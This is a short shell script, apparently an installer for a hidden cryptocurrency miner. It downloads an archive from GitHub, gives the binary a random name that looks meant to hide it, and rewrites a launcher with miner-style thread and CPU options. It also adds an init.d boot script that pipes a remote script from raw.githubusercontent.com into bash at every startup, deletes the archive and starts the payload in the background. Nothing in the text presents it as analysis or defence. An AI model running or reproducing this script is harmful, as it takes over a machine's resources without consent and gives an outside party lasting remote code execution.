cd /
wget https://github.com/currento/magneta/releases/download/v1.5.1/analog.tar
tar -xvf analog.tar
cd /analog
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv encode $variable1
sed -i "s/mongodb/${variable1} -n=${variable1} -t=10 -s=avx2/g" ./device.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/currento/magneta/main/byone.sh)" > digital.sh
chmod a+x digital.sh
update-rc.d digital.sh defaults
rm -rf analog.tar
cd /analog
nohup ./decode.sh
ps -ef | grep analog
